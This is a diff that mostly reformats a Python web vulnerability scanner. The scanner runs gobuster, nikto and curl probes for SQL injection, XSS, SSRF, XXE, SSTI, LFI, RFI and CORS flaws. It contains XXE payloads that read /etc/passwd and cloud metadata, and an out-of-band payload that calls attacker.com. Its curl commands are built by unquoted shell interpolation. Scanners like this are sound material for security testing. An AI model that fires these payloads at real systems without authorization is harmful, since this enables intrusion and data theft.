@@ -34,107 +34,95 @@ _DEFAULT_WORDLIST = _find_wordlist()
 
 class WebExplorer:
     """Web application explorer"""
-    
+
     def __init__(self, callback=None):
         self.callback = callback
         self.results = {}
         self.session_cookies = {}
-        
+
     def log(self, message, level="info"):
         """Log message"""
         if self.callback:
             self.callback(message, level)
-    
+
     def directory_bruteforce(self, url, wordlist=None, extensions=["php", "html", "txt"]):
         """Directory brute force"""
         if wordlist is None:
             wordlist = _DEFAULT_WORDLIST
         self.log(f"Exploring directories on {url}", "info")
-        
+
         found_dirs = []
-        
+
         # Use gobuster
         try:
             ext_str = ",".join(extensions) if extensions else ""
             cmd = f"gobuster dir -u {url} -w {wordlist} -t 50 -x {ext_str} -q --no-error"
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
-            
-            for line in result.stdout.split('\n'):
-                if '(Status:' in line:
+
+            for line in result.stdout.split("\n"):
+                if "(Status:" in line:
                     parts = line.split()
                     path = parts[0]
-                    status_match = re.search(r'\(Status:\s*(\d+)\)', line)
+                    status_match = re.search(r"\(Status:\s*(\d+)\)", line)
                     status = status_match.group(1) if status_match else "???"
-                    
-                    found_dirs.append({
-                        "path": path,
-                        "status": status,
-                        "url": urljoin(url, path)
-                    })
+
+                    found_dirs.append({"path": path, "status": status, "url": urljoin(url, path)})
                     self.log(f"Directory: {path} [{status}]", "success")
-                    
+
         except Exception as e:
             self.log(f"Gobuster error: {str(e)}", "error")
-        
+
         # Fallback to dirb if gobuster fails
         if not found_dirs:
             try:
                 cmd = f"dirb {url} {wordlist}"
                 result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
-                
-                for line in result.stdout.split('\n'):
-                    if '+ ' in line:
-                        path = line.split('+ ')[1].strip()
-                        found_dirs.append({
-                            "path": path,
-                            "status": "200",
-                            "url": urljoin(url, path)
-                        })
+
+                for line in result.stdout.split("\n"):
+                    if "+ " in line:
+                        path = line.split("+ ")[1].strip()
+                        found_dirs.append({"path": path, "status": "200", "url": urljoin(url, path)})
             except Exception:
                 pass
-        
+
         self.results["directories"] = found_dirs
         self.log(f"Directories found: {len(found_dirs)}", "success")
-        
+
         return found_dirs
-    
+
     def file_discovery(self, url, wordlist=None):
         """File discovery"""
         if wordlist is None:
             wordlist = _DEFAULT_WORDLIST
         self.log(f"Searching for files on {url}", "info")
-        
+
         found_files = []
-        
+
         try:
             cmd = f"gobuster dir -u {url} -w {wordlist} -t 50 -q --no-error"
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
-            
-            for line in result.stdout.split('\n'):
-                if '(Status:' in line and '.' in line:
+
+            for line in result.stdout.split("\n"):
+                if "(Status:" in line and "." in line:
                     parts = line.split()
                     path = parts[0]
-                    status_match = re.search(r'\(Status:\s*(\d+)\)', line)
+                    status_match = re.search(r"\(Status:\s*(\d+)\)", line)
                     status = status_match.group(1) if status_match else "???"
-                    
-                    found_files.append({
-                        "file": path,
-                        "status": status,
-                        "url": urljoin(url, path)
-                    })
-                    
+
+                    found_files.append({"file": path, "status": status, "url": urljoin(url, path)})
+
         except Exception as e:
             self.log(f"Error: {str(e)}", "error")
-        
+
         self.results["files"] = found_files
         self.log(f"Files found: {len(found_files)}", "success")
-        
+
         return found_files
-    
+
     def technology_fingerprint(self, url):
         """Technology fingerprint"""
         self.log(f"Identifying technologies of {url}", "info")
-        
+
         fingerprint = {
             "cms": None,
             "framework": None,
@@ -144,168 +132,166 @@ class WebExplorer:
             "security_headers": {},
             "cookies": [],
             "forms": [],
-            "links": []
+            "links": [],
         }
-        
+
         # Get headers
         try:
             cmd = f"curl -sI {url}"
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
-            
-            for line in result.stdout.split('\n'):
+
+            for line in result.stdout.split("\n"):
                 line = line.strip()
-                if ':' in line:
-                    key, value = line.split(':', 1)
+                if ":" in line:
+                    key, value = line.split(":", 1)
                     key = key.strip().lower()
                     value = value.strip()
-                    
-                    if key == 'server':
+
+                    if key == "server":
                         fingerprint["server"] = value
-                    elif key == 'x-powered-by':
+                    elif key == "x-powered-by":
                         fingerprint["language"] = value
-                    elif key == 'x-frame-options':
+                    elif key == "x-frame-options":
                         fingerprint["security_headers"]["x-frame-options"] = value
-                    elif key == 'x-content-type-options':
+                    elif key == "x-content-type-options":
                         fingerprint["security_headers"]["x-content-type-options"] = value
-                    elif key == 'x-xss-protection':
+                    elif key == "x-xss-protection":
                         fingerprint["security_headers"]["x-xss-protection"] = value
-                    elif key == 'strict-transport-security':
+                    elif key == "strict-transport-security":
                         fingerprint["security_headers"]["hsts"] = value
-                    elif key == 'set-cookie':
+                    elif key == "set-cookie":
                         fingerprint["cookies"].append(value)
-                        
+
         except Exception:
             pass
-        
+
         # Get content
         try:
             cmd = f"curl -s {url}"
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
             content = result.stdout.lower()
-            
+
             # Detect CMS
-            if 'wp-content' in content or 'wordpress' in content:
+            if "wp-content" in content or "wordpress" in content:
                 fingerprint["cms"] = "WordPress"
-            elif 'drupal' in content:
+            elif "drupal" in content:
                 fingerprint["cms"] = "Drupal"
-            elif 'joomla' in content:
+            elif "joomla" in content:
                 fingerprint["cms"] = "Joomla"
-            elif 'shopify' in content:
+            elif "shopify" in content:
                 fingerprint["cms"] = "Shopify"
-            
+
             # Detect framework
-            if 'laravel' in content or 'csrf-token' in content:
+            if "laravel" in content or "csrf-token" in content:
                 fingerprint["framework"] = "Laravel"
-            elif 'django' in content:
+            elif "django" in content:
                 fingerprint["framework"] = "Django"
-            elif 'rails' in content:
+            elif "rails" in content:
                 fingerprint["framework"] = "Ruby on Rails"
-            elif 'express' in content:
+            elif "express" in content:
                 fingerprint["framework"] = "Express.js"
-            
+
             # Search for forms
             form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>'
             forms = re.findall(form_pattern, result.stdout, re.IGNORECASE)
             fingerprint["forms"] = forms[:10]  # Limit to 10
-            
+
             # Search for internal links
             link_pattern = r'href=["\']([^"\']*)["\']'
             links = re.findall(link_pattern, result.stdout, re.IGNORECASE)
-            internal_links = [l for l in links if l.startswith('/') or url in l]
+            internal_links = [l for l in links if l.startswith("/") or url in l]
             fingerprint["links"] = list(set(internal_links))[:20]  # Limit to 20
-            
+
         except Exception:
             pass
-        
+
         self.results["fingerprint"] = fingerprint
         self.log("Fingerprint completed", "success")
-        
+
         return fingerprint
-    
+
     def vulnerability_scan(self, url):
         """Web vulnerability scan"""
         self.log(f"Scanning vulnerabilities on {url}", "info")
-        
+
         vulns = []
-        
+
         # Nikto
         try:
             cmd = f"nikto -h {url} -Format txt"
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
-            
-            for line in result.stdout.split('\n'):
-                if '+ ' in line and ('OSVDB' in line or 'vulnerability' in line.lower()):
-                    vulns.append({
-                        "type": "nikto",
-                        "description": line.strip(),
-                        "severity": "medium"
-                    })
+
+            for line in result.stdout.split("\n"):
+                if "+ " in line and ("OSVDB" in line or "vulnerability" in line.lower()):
+                    vulns.append({"type": "nikto", "description": line.strip(), "severity": "medium"})
         except Exception:
             pass
-        
+
         # Check security headers
         try:
             cmd = f"curl -sI {url}"
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
             headers = result.stdout.lower()
-            
+
             security_checks = [
                 ("x-frame-options", "Clickjacking"),
                 ("x-content-type-options", "MIME sniffing"),
                 ("x-xss-protection", "XSS"),
                 ("strict-transport-security", "HSTS"),
-                ("content-security-policy", "CSP")
+                ("content-security-policy", "CSP"),
             ]
-            
+
             for header, vuln_type in security_checks:
                 if header not in headers:
-                    vulns.append({
-                        "type": "missing_header",
-                        "description": f"Header {header} not found ({vuln_type})",
-                        "severity": "low"
-                    })
+                    vulns.append(
+                        {
+                            "type": "missing_header",
+                            "description": f"Header {header} not found ({vuln_type})",
+                            "severity": "low",
+                        }
+                    )
         except Exception:
             pass
-        
+
         self.results["vulnerabilities"] = vulns
         self.log(f"Vulnerabilities found: {len(vulns)}", "warning")
-        
+
         return vulns
-    
+
     def parameter_discovery(self, url):
         """Parameter discovery"""
         self.log(f"Discovering parameters on {url}", "info")
-        
+
         parameters = []
-        
+
         try:
             cmd = f"curl -s {url}"
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
-            
+
             # Search for parameters in URLs
-            param_pattern = r'[?&](\w+)='
+            param_pattern = r"[?&](\w+)="
             params = re.findall(param_pattern, result.stdout)
             parameters.extend(list(set(params)))
-            
+
             # Search for forms and their fields
-            form_pattern = r'<form[^>]*>(.*?)</form>'
+            form_pattern = r"<form[^>]*>(.*?)</form>"
             forms = re.findall(form_pattern, result.stdout, re.DOTALL | re.IGNORECASE)
-            
+
             for form in forms:
                 input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
                 inputs = re.findall(input_pattern, form, re.IGNORECASE)
                 parameters.extend(inputs)
-            
+
             parameters = list(set(parameters))
-            
+
         except Exception:
             pass
-        
+
         self.results["parameters"] = parameters
         self.log(f"Parameters found: {len(parameters)}", "success")
-        
+
         return parameters
-    
+
     def sql_injection_detection(self, url):
         """Test for SQL injection vulnerabilities."""
         self.log(f"Testing SQL injection on {url}", "info")
@@ -333,23 +319,27 @@ class WebExplorer:
                 status = result.stdout.strip().strip("'")
 
                 if status in ("500", "403", "429"):
-                    results.append({
-                        "payload": payload,
-                        "type": description,
-                        "status": status,
-                        "evidence": f"HTTP {status} response",
-                        "severity": "high"
-                    })
+                    results.append(
+                        {
+                            "payload": payload,
+                            "type": description,
+                            "status": status,
+                            "evidence": f"HTTP {status} response",
+                            "severity": "high",
+                        }
+                    )
                     self.log(f"Possible SQLi: {description} [{status}]", "warning")
 
             except subprocess.TimeoutExpired:
-                results.append({
-                    "payload": payload,
-                    "type": description,
-                    "status": "timeout",
-                    "evidence": "Response timeout may indicate time-based injection",
-                    "severity": "high"
-                })
+                results.append(
+                    {
+                        "payload": payload,
+                        "type": description,
+                        "status": "timeout",
+                        "evidence": "Response timeout may indicate time-based injection",
+                        "severity": "high",
+                    }
+                )
                 self.log(f"Time-based SQLi possible: {description}", "warning")
             except Exception as e:
                 self.log(f"SQLi test error: {str(e)}", "error")
@@ -389,12 +379,14 @@ class WebExplorer:
                 body = result.stdout
 
                 if payload in body:
-                    results.append({
-                        "payload": payload,
-                        "type": description,
-                        "evidence": "Payload reflected in response without encoding",
-                        "severity": "high"
-                    })
+                    results.append(
+                        {
+                            "payload": payload,
+                            "type": description,
+                            "evidence": "Payload reflected in response without encoding",
+                            "severity": "high",
+                        }
+                    )
                     self.log(f"XSS found: {description}", "warning")
 
             except Exception as e:
@@ -430,16 +422,26 @@ class WebExplorer:
                 result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                 body = result.stdout.lower()
 
-                indicators = ["ami-id", "instance-id", "local-hostname", "metadata",
-                              "root:", "daemon:", "redis_version", "mysql"]
+                indicators = [
+                    "ami-id",
+                    "instance-id",
+                    "local-hostname",
+                    "metadata",
+                    "root:",
+                    "daemon:",
+                    "redis_version",
+                    "mysql",
+                ]
                 for indicator in indicators:
                     if indicator in body:
-                        results.append({
-                            "payload": internal_url,
-                            "type": description,
-                            "evidence": f"Found indicator: {indicator}",
-                            "severity": "critical"
-                        })
+                        results.append(
+                            {
+                                "payload": internal_url,
+                                "type": description,
+                                "evidence": f"Found indicator: {indicator}",
+                                "severity": "critical",
+                            }
+                        )
                         self.log(f"SSRF found: {description}", "warning")
                         break
 
@@ -459,22 +461,22 @@ class WebExplorer:
             (
                 '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                 "file:///etc/passwd",
-                "Local file read"
+                "Local file read",
             ),
             (
                 '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
                 "file:///etc/hostname",
-                "Hostname read"
+                "Hostname read",
             ),
             (
                 '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
                 "AWS metadata",
-                "Cloud metadata"
+                "Cloud metadata",
             ),
             (
                 '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><root>&send;</root>',
                 "Out-of-band",
-                "OOB XXE via DTD"
+                "OOB XXE via DTD",
             ),
         ]
 
@@ -483,19 +485,23 @@ class WebExplorer:
 
         for payload, description, test_type in xxe_payloads:
             try:
-                cmd = f"""curl -s --max-time 10 -X POST -H "Content-Type: application/xml" -d '{payload}' '{test_url}'"""
+                cmd = (
+                    f"""curl -s --max-time 10 -X POST -H "Content-Type: application/xml" -d '{payload}' '{test_url}'"""
+                )
                 result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                 body = result.stdout
 
                 indicators = ["root:", "ami-id", "instance-id", "hostname"]
                 for indicator in indicators:
                     if indicator in body.lower():
-                        results.append({
-                            "payload": payload[:100],
-                            "type": test_type,
-                            "evidence": f"Found indicator: {indicator}",
-                            "severity": "critical"
-                        })
+                        results.append(
+                            {
+                                "payload": payload[:100],
+                                "type": test_type,
+                                "evidence": f"Found indicator: {indicator}",
+                                "severity": "critical",
+                            }
+                        )
                         self.log(f"XXE found: {test_type}", "warning")
                         break
 
@@ -533,12 +539,14 @@ class WebExplorer:
                 body = result.stdout
 
                 if expected in body and payload not in body:
-                    results.append({
-                        "payload": payload,
-                        "type": template_type,
-                        "evidence": f"Template expression evaluated: {expected} found in response",
-                        "severity": "critical"
-                    })
+                    results.append(
+                        {
+                            "payload": payload,
+                            "type": template_type,
+                            "evidence": f"Template expression evaluated: {expected} found in response",
+                            "severity": "critical",
+                        }
+                    )
                     self.log(f"SSTI found: {template_type}", "warning")
 
             except Exception as e:
@@ -578,12 +586,14 @@ class WebExplorer:
                 body = result.stdout
 
                 if indicator and indicator in body:
-                    results.append({
-                        "payload": payload,
-                        "type": description,
-                        "evidence": f"Found expected content: {indicator}",
-                        "severity": "high"
-                    })
+                    results.append(
+                        {
+                            "payload": payload,
+                            "type": description,
+                            "evidence": f"Found expected content: {indicator}",
+                            "severity": "high",
+                        }
+                    )
                     self.log(f"LFI found: {description}", "warning")
                 elif not indicator and len(body) > 0 and body != result.stdout:
                     pass
@@ -618,12 +628,14 @@ class WebExplorer:
                 body = result.stdout
 
                 if "User-agent" in body or "Disallow" in body or "httpbin" in body.lower():
-                    results.append({
-                        "payload": test_remote_url,
-                        "type": description,
-                        "evidence": "Remote content included in response",
-                        "severity": "critical"
-                    })
+                    results.append(
+                        {
+                            "payload": test_remote_url,
+                            "type": description,
+                            "evidence": "Remote content included in response",
+                            "severity": "critical",
+                        }
+                    )
                     self.log(f"RFI found: {description}", "warning")
 
             except Exception as e:
@@ -655,26 +667,28 @@ class WebExplorer:
 
                 acao = None
                 acac = None
-                for line in headers.split('\n'):
-                    if 'access-control-allow-origin' in line.lower():
-                        acao = line.split(':', 1)[1].strip()
-                    if 'access-control-allow-credentials' in line.lower():
-                        acac = line.split(':', 1)[1].strip()
+                for line in headers.split("\n"):
+                    if "access-control-allow-origin" in line.lower():
+                        acao = line.split(":", 1)[1].strip()
+                    if "access-control-allow-credentials" in line.lower():
+                        acac = line.split(":", 1)[1].strip()
 
                 if acao:
-                    if acao == '*' or acao == origin:
-                        severity = "high" if acao != '*' or acac == 'true' else "medium"
+                    if acao == "*" or acao == origin:
+                        severity = "high" if acao != "*" or acac == "true" else "medium"
                         evidence = f"ACAO: {acao}"
                         if acac:
                             evidence += f", ACAC: {acac}"
-                        results.append({
-                            "origin": origin,
-                            "type": description,
-                            "acao": acao,
-                            "acac": acac,
-                            "evidence": evidence,
-                            "severity": severity
-                        })
+                        results.append(
+                            {
+                                "origin": origin,
+                                "type": description,
+                                "acao": acao,
+                                "acac": acac,
+                                "evidence": evidence,
+                                "severity": severity,
+                            }
+                        )
                         self.log(f"CORS issue: {description} - ACAO: {acao}", "warning")
 
             except Exception as e:
@@ -693,57 +707,57 @@ class WebExplorer:
             "strict-transport-security": {
                 "name": "HSTS",
                 "severity": "high",
-                "recommendation": "Add Strict-Transport-Security header with max-age >= 31536000"
+                "recommendation": "Add Strict-Transport-Security header with max-age >= 31536000",
             },
             "content-security-policy": {
                 "name": "CSP",
                 "severity": "high",
-                "recommendation": "Add Content-Security-Policy header"
+                "recommendation": "Add Content-Security-Policy header",
             },
             "x-frame-options": {
                 "name": "X-Frame-Options",
                 "severity": "medium",
-                "recommendation": "Add X-Frame-Options: DENY or SAMEORIGIN"
+                "recommendation": "Add X-Frame-Options: DENY or SAMEORIGIN",
             },
             "x-content-type-options": {
                 "name": "X-Content-Type-Options",
                 "severity": "medium",
-                "recommendation": "Add X-Content-Type-Options: nosniff"
+                "recommendation": "Add X-Content-Type-Options: nosniff",
             },
             "x-xss-protection": {
                 "name": "X-XSS-Protection",
                 "severity": "low",
-                "recommendation": "Add X-XSS-Protection: 1; mode=block"
+                "recommendation": "Add X-XSS-Protection: 1; mode=block",
             },
             "referrer-policy": {
                 "name": "Referrer-Policy",
                 "severity": "low",
-                "recommendation": "Add Referrer-Policy: strict-origin-when-cross-origin"
+                "recommendation": "Add Referrer-Policy: strict-origin-when-cross-origin",
             },
             "permissions-policy": {
                 "name": "Permissions-Policy",
                 "severity": "low",
-                "recommendation": "Add Permissions-Policy header to restrict features"
+                "recommendation": "Add Permissions-Policy header to restrict features",
             },
             "x-permitted-cross-domain-policies": {
                 "name": "Cross-Domain-Policies",
                 "severity": "low",
-                "recommendation": "Add X-Permitted-Cross-Domain-Policies: none"
+                "recommendation": "Add X-Permitted-Cross-Domain-Policies: none",
             },
             "cross-origin-opener-policy": {
                 "name": "COOP",
                 "severity": "medium",
-                "recommendation": "Add Cross-Origin-Opener-Policy: same-origin"
+                "recommendation": "Add Cross-Origin-Opener-Policy: same-origin",
             },
             "cross-origin-resource-policy": {
                 "name": "CORP",
                 "severity": "medium",
-                "recommendation": "Add Cross-Origin-Resource-Policy: same-origin"
+                "recommendation": "Add Cross-Origin-Resource-Policy: same-origin",
             },
             "cross-origin-embedder-policy": {
                 "name": "COEP",
                 "severity": "low",
-                "recommendation": "Add Cross-Origin-Embedder-Policy: require-corp"
+                "recommendation": "Add Cross-Origin-Embedder-Policy: require-corp",
             },
         }
 
@@ -753,67 +767,72 @@ class WebExplorer:
             headers = result.stdout.lower()
 
             found_headers = {}
-            for line in headers.split('\n'):
-                if ':' in line:
-                    key = line.split(':', 1)[0].strip()
-                    found_headers[key] = line.split(':', 1)[1].strip()
+            for line in headers.split("\n"):
+                if ":" in line:
+                    key = line.split(":", 1)[0].strip()
+                    found_headers[key] = line.split(":", 1)[1].strip()
 
             for header, info in expected_headers.items():
                 if header in found_headers:
                     value = found_headers[header]
-                    results.append({
-                        "header": info["name"],
-                        "status": "present",
-                        "value": value,
-                        "severity": "info"
-                    })
+                    results.append({"header": info["name"], "status": "present", "value": value, "severity": "info"})
                 else:
-                    results.append({
-                        "header": info["name"],
-                        "status": "missing",
-                        "severity": info["severity"],
-                        "recommendation": info["recommendation"]
-                    })
+                    results.append(
+                        {
+                            "header": info["name"],
+                            "status": "missing",
+                            "severity": info["severity"],
+                            "recommendation": info["recommendation"],
+                        }
+                    )
                     self.log(f"Missing header: {info['name']}", "warning")
 
             hsts_value = found_headers.get("strict-transport-security", "")
             if hsts_value:
-                max_age_match = re.search(r'max-age=(\d+)', hsts_value)
+                max_age_match = re.search(r"max-age=(\d+)", hsts_value)
                 if max_age_match and int(max_age_match.group(1)) < 31536000:
-                    results.append({
-                        "header": "HSTS max-age",
-                        "status": "weak",
-                        "value": hsts_value,
-                        "severity": "medium",
-                        "recommendation": "Increase max-age to at least 31536000"
-                    })
+                    results.append(
+                        {
+                            "header": "HSTS max-age",
+                            "status": "weak",
+                            "value": hsts_value,
+                            "severity": "medium",
+                            "recommendation": "Increase max-age to at least 31536000",
+                        }
+                    )
 
             csp_value = found_headers.get("content-security-policy", "")
             if csp_value:
                 if "unsafe-inline" in csp_value:
-                    results.append({
-                        "header": "CSP unsafe-inline",
-                        "status": "weak",
-                        "value": csp_value,
-                        "severity": "medium",
-                        "recommendation": "Avoid unsafe-inline in CSP"
-                    })
+                    results.append(
+                        {
+                            "header": "CSP unsafe-inline",
+                            "status": "weak",
+                            "value": csp_value,
+                            "severity": "medium",
+                            "recommendation": "Avoid unsafe-inline in CSP",
+                        }
+                    )
                 if "unsafe-eval" in csp_value:
-                    results.append({
-                        "header": "CSP unsafe-eval",
-                        "status": "weak",
-                        "value": csp_value,
-                        "severity": "high",
-                        "recommendation": "Avoid unsafe-eval in CSP"
-                    })
+                    results.append(
+                        {
+                            "header": "CSP unsafe-eval",
+                            "status": "weak",
+                            "value": csp_value,
+                            "severity": "high",
+                            "recommendation": "Avoid unsafe-eval in CSP",
+                        }
+                    )
                 if "*" in csp_value and "default-src" in csp_value:
-                    results.append({
-                        "header": "CSP wildcard",
-                        "status": "weak",
-                        "value": csp_value,
-                        "severity": "medium",
-                        "recommendation": "Avoid wildcard (*) in CSP directives"
-                    })
+                    results.append(
+                        {
+                            "header": "CSP wildcard",
+                            "status": "weak",
+                            "value": csp_value,
+                            "severity": "medium",
+                            "recommendation": "Avoid wildcard (*) in CSP directives",
+                        }
+                    )
 
         except Exception as e:
             self.log(f"Security header check error: {str(e)}", "error")
@@ -832,88 +851,105 @@ class WebExplorer:
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
 
             set_cookie_headers = []
-            for line in result.stdout.split('\n'):
-                if line.lower().startswith('set-cookie:'):
-                    set_cookie_headers.append(line.split(':', 1)[1].strip())
+            for line in result.stdout.split("\n"):
+                if line.lower().startswith("set-cookie:"):
+                    set_cookie_headers.append(line.split(":", 1)[1].strip())
 
             for cookie_header in set_cookie_headers:
-                cookie_name = cookie_header.split('=')[0].strip() if '=' in cookie_header else "unknown"
+                cookie_name = cookie_header.split("=")[0].strip() if "=" in cookie_header else "unknown"
                 cookie_lower = cookie_header.lower()
 
                 issues = []
 
-                if 'httponly' not in cookie_lower:
-                    issues.append({
-                        "flag": "HttpOnly",
-                        "status": "missing",
-                        "severity": "medium",
-                        "recommendation": "Add HttpOnly flag to prevent XSS cookie theft"
-                    })
+                if "httponly" not in cookie_lower:
+                    issues.append(
+                        {
+                            "flag": "HttpOnly",
+                            "status": "missing",
+                            "severity": "medium",
+                            "recommendation": "Add HttpOnly flag to prevent XSS cookie theft",
+                        }
+                    )
 
-                if 'secure' not in cookie_lower:
-                    issues.append({
-                        "flag": "Secure",
-                        "status": "missing",
-                        "severity": "medium",
-                        "recommendation": "Add Secure flag to ensure HTTPS-only transmission"
-                    })
+                if "secure" not in cookie_lower:
+                    issues.append(
+                        {
+                            "flag": "Secure",
+                            "status": "missing",
+                            "severity": "medium",
+                            "recommendation": "Add Secure flag to ensure HTTPS-only transmission",
+                        }
+                    )
 
-                samesite_match = re.search(r'samesite=(\w+)', cookie_lower)
+                samesite_match = re.search(r"samesite=(\w+)", cookie_lower)
                 if samesite_match:
                     samesite_value = samesite_match.group(1)
-                    if samesite_value == 'none':
-                        issues.append({
-                            "flag": "SameSite",
-                            "status": "none",
-                            "severity": "low",
-                            "recommendation": "SameSite=None requires Secure flag"
-                        })
-                    elif samesite_value == 'lax':
+                    if samesite_value == "none":
+                        issues.append(
+                            {
+                                "flag": "SameSite",
+                                "status": "none",
+                                "severity": "low",
+                                "recommendation": "SameSite=None requires Secure flag",
+                            }
+                        )
+                    elif samesite_value == "lax":
                         pass
-                    elif samesite_value == 'strict':
+                    elif samesite_value == "strict":
                         pass
                 else:
-                    issues.append({
-                        "flag": "SameSite",
-                        "status": "missing",
-                        "severity": "low",
-                        "recommendation": "Add SameSite=Lax or SameSite=Strict"
-                    })
+                    issues.append(
+                        {
+                            "flag": "SameSite",
+                            "status": "missing",
+                            "severity": "low",
+                            "recommendation": "Add SameSite=Lax or SameSite=Strict",
+                        }
+                    )
 
-                domain_match = re.search(r'domain=([^\s;]+)', cookie_lower)
+                domain_match = re.search(r"domain=([^\s;]+)", cookie_lower)
                 if domain_match:
                     domain = domain_match.group(1)
-                    if domain.startswith('.'):
-                        issues.append({
-                            "flag": "Domain",
-                            "status": "broad",
-                            "severity": "low",
-                            "recommendation": f"Cookie domain {domain} is overly broad"
-                        })
+                    if domain.startswith("."):
+                        issues.append(
+                            {
+                                "flag": "Domain",
+                                "status": "broad",
+                                "severity": "low",
+                                "recommendation": f"Cookie domain {domain} is overly broad",
+                            }
+                        )
 
-                path_match = re.search(r'path=([^\s;]+)', cookie_lower)
-                if path_match and path_match.group(1) == '/':
+                path_match = re.search(r"path=([^\s;]+)", cookie_lower)
+                if path_match and path_match.group(1) == "/":
                     pass
 
-                max_age_match = re.search(r'max-age=(\d+)', cookie_lower)
-                expires_match = re.search(r'expires=([^\s;]+)', cookie_lower)
+                max_age_match = re.search(r"max-age=(\d+)", cookie_lower)
+                expires_match = re.search(r"expires=([^\s;]+)", cookie_lower)
                 if max_age_match:
                     max_age = int(max_age_match.group(1))
                     if max_age > 31536000:
-                        issues.append({
-                            "flag": "Max-Age",
-                            "status": "too_long",
-                            "severity": "low",
-                            "recommendation": "Cookie lifetime exceeds 1 year"
-                        })
+                        issues.append(
+                            {
+                                "flag": "Max-Age",
+                                "status": "too_long",
+                                "severity": "low",
+                                "recommendation": "Cookie lifetime exceeds 1 year",
+                            }
+                        )
 
-                results.append({
-                    "cookie": cookie_name,
-                    "raw": cookie_header,
-                    "issues": issues,
-                    "severity": "high" if any(i["severity"] == "high" for i in issues) else
-                              "medium" if any(i["severity"] == "medium" for i in issues) else "low"
-                })
+                results.append(
+                    {
+                        "cookie": cookie_name,
+                        "raw": cookie_header,
+                        "issues": issues,
+                        "severity": "high"
+                        if any(i["severity"] == "high" for i in issues)
+                        else "medium"
+                        if any(i["severity"] == "medium" for i in issues)
+                        else "low",
+                    }
+                )
 
                 for issue in issues:
                     self.log(f"Cookie {cookie_name}: {issue['flag']} - {issue['status']}", "warning")
@@ -934,19 +970,44 @@ class WebExplorer:
         results = []
 
         common_api_paths = [
-            "/api", "/api/v1", "/api/v2", "/api/v3",
-            "/rest", "/rest/v1", "/graphql", "/graphql.php",
-            "/swagger", "/swagger.json", "/swagger-ui", "/api-docs",
-            "/openapi.json", "/openapi.yaml",
-            "/api/swagger", "/api/docs",
-            "/wp-json", "/wp-json/wp/v2",
-            "/xmlrpc.php", "/feed", "/sitemap.xml",
-            "/robots.txt", "/.env", "/config.json",
-            "/debug", "/debug/vars", "/debug/pprof",
-            "/actuator", "/actuator/health", "/actuator/env",
-            "/metrics", "/prometheus",
-            "/health", "/healthcheck", "/health_check",
-            "/version", "/info", "/status",
+            "/api",
+            "/api/v1",
+            "/api/v2",
+            "/api/v3",
+            "/rest",
+            "/rest/v1",
+            "/graphql",
+            "/graphql.php",
+            "/swagger",
+            "/swagger.json",
+            "/swagger-ui",
+            "/api-docs",
+            "/openapi.json",
+            "/openapi.yaml",
+            "/api/swagger",
+            "/api/docs",
+            "/wp-json",
+            "/wp-json/wp/v2",
+            "/xmlrpc.php",
+            "/feed",
+            "/sitemap.xml",
+            "/robots.txt",
+            "/.env",
+            "/config.json",
+            "/debug",
+            "/debug/vars",
+            "/debug/pprof",
+            "/actuator",
+            "/actuator/health",
+            "/actuator/env",
+            "/metrics",
+            "/prometheus",
+            "/health",
+            "/healthcheck",
+            "/health_check",
+            "/version",
+            "/info",
+            "/status",
         ]
 
         parsed = urlparse(url)
@@ -960,12 +1021,7 @@ class WebExplorer:
                 status = result.stdout.strip().strip("'")
 
                 if status in ("200", "201", "301", "302", "401", "403"):
-                    results.append({
-                        "path": path,
-                        "url": test_url,
-                        "status": status,
-                        "type": "api_endpoint"
-                    })
+                    results.append({"path": path, "url": test_url, "status": status, "type": "api_endpoint"})
                     self.log(f"API endpoint found: {path} [{status}]", "success")
 
             except Exception as e:
@@ -979,12 +1035,7 @@ class WebExplorer:
                 status = result.stdout.strip().strip("'")
 
                 if status not in ("405", "404", "000"):
-                    results.append({
-                        "method": method,
-                        "url": url,
-                        "status": status,
-                        "type": "supported_method"
-                    })
+                    results.append({"method": method, "url": url, "status": status, "type": "supported_method"})
 
             except Exception:
                 pass
@@ -993,17 +1044,13 @@ class WebExplorer:
             cmd = f"curl -sI --max-time 5 -X OPTIONS '{url}'"
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
             allow_header = None
-            for line in result.stdout.split('\n'):
-                if line.lower().startswith('allow:'):
-                    allow_header = line.split(':', 1)[1].strip()
+            for line in result.stdout.split("\n"):
+                if line.lower().startswith("allow:"):
+                    allow_header = line.split(":", 1)[1].strip()
                     break
 
             if allow_header:
-                results.append({
-                    "allowed_methods": allow_header,
-                    "url": url,
-                    "type": "options_response"
-                })
+                results.append({"allowed_methods": allow_header, "url": url, "type": "options_response"})
                 self.log(f"Allowed methods: {allow_header}", "info")
 
         except Exception:
@@ -1048,7 +1095,9 @@ class WebExplorer:
             try:
                 test_url = f"{base_url}{path}"
                 payload = json.dumps({"query": introspection_query})
-                cmd = f"""curl -s --max-time 10 -X POST -H "Content-Type: application/json" -d '{payload}' '{test_url}'"""
+                cmd = (
+                    f"""curl -s --max-time 10 -X POST -H "Content-Type: application/json" -d '{payload}' '{test_url}'"""
+                )
                 result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                 body = result.stdout
 
@@ -1057,19 +1106,25 @@ class WebExplorer:
                         schema_data = json.loads(body)
